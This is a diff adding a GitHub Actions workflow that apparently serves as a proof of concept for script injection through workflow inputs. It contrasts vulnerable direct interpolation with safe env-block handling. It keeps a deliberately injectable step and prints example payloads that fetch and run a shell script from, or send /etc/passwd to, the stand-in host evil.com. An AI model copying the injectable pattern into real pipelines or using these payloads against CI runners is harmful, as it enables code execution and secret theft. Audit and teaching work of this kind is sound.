@@ -1,0 +1,83 @@
+name: "POC-2: Script Injection via Inputs"
+
+on:
+  workflow_dispatch:
+    inputs:
+      build_number:
+        description: "Build number (try: 1$(curl evil.com/shell.sh|bash))"
+        type: string
+        default: "1"
+      additional_env:
+        description: "Additional env (try: FOO=bar$(whoami))"
+        type: string
+        default: ""
+
+permissions:
+  contents: read
+
+jobs:
+  test-injection:
+    runs-on: ubuntu-latest
+    steps:
+      # --- 危险写法: input 直接插值 ---
+      - name: "VULNERABLE: Input directly interpolated in run"
+        run: |
+          echo "=== VULNERABLE PATTERN ==="
+          echo "build_number=${{ inputs.build_number }}"
+          # If input = "1$(whoami)", the command $(whoami) gets EXECUTED
+          # In original repo: echo "BUILD_NUMBER=${{ inputs.build_number }}" >> $GITHUB_ENV
+          # In original repo: sed -i "s/^CI_BUILD_NUMBER=.*/CI_BUILD_NUMBER=${{ inputs.build_number }}/" .env
+
+      # --- 安全写法: 通过 env 块中转 ---
+      - name: "SAFE: Input via env block"
+        env:
+          INPUT_BUILD_NUMBER: ${{ inputs.build_number }}
+        run: |
+          echo "=== SAFE PATTERN ==="
+          echo "build_number=$INPUT_BUILD_NUMBER"
+          # Even if input contains $(whoami), it's treated as a literal string
+
+      # --- 实际演示注入 ---
+      - name: "PROOF: Demonstrate injection"
+        run: |
+          echo "=== ACTUAL INJECTION TEST ==="
+          echo ""
+          echo "If attacker provides build_number = '1; echo PWNED; echo'"
+          echo "VULNERABLE code becomes:"
+          echo '  echo "BUILD_NUMBER=1; echo PWNED; echo" >> $GITHUB_ENV'
+          echo "  -> Shell executes: echo 'BUILD_NUMBER=1', then 'echo PWNED', then 'echo'"
+          echo ""
+          echo "If attacker provides build_number = '1\$(curl -d @/etc/passwd evil.com)'"
+          echo "VULNERABLE code becomes:"
+          echo '  echo "BUILD_NUMBER=1$(curl -d @/etc/passwd evil.com)" >> $GITHUB_ENV'
+          echo "  -> Shell executes curl, exfiltrating /etc/passwd"
+          echo ""
+          echo "With SAFE pattern (env block), the same input is just a string value."
+          echo "No command substitution happens."
+
+      - name: "PROOF: sed injection too"
+        run: |
+          echo "=== SED INJECTION ==="
+          echo "Original code: sed -i \"s/^CI_BUILD_NUMBER=.*/CI_BUILD_NUMBER=${{ inputs.build_number }}/\" .env"
+          echo ""
+          echo "If input contains '/' (sed delimiter): 1/;s/^/POWNED/"
+          echo "sed command becomes: sed -i 's/^CI_BUILD_NUMBER=.*/CI_BUILD_NUMBER=1/;s/^/POWNED/' .env"
+          echo "-> Attacker injects arbitrary sed commands to modify any line in .env"
+
+  test-additional-env-injection:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "VULNERABLE: additional_env injection (C-5)"
+        run: |
+          echo "=== SHARED-ENV ADDITIONAL_ENV INJECTION ==="
+          echo ""
+          echo "Original code in shared-env/action.yml:"
+          echo '  echo "${{ inputs.additional_env }}" >> ${TARGET_ENV_FILE}'
+          echo ""
+          echo "If additional_env = 'FOO=bar\nMALICIOUS=$(curl evil.com|bash)'"
+          echo "The attacker gains RCE on the runner with access to secrets."
+          echo ""
+          echo "SAFE alternative:"
+          echo '  env:'
+          echo '    ADDITIONAL_ENV: ${{ inputs.additional_env }}'
+          echo '  run: echo "$ADDITIONAL_ENV" >> ${TARGET_ENV_FILE}'
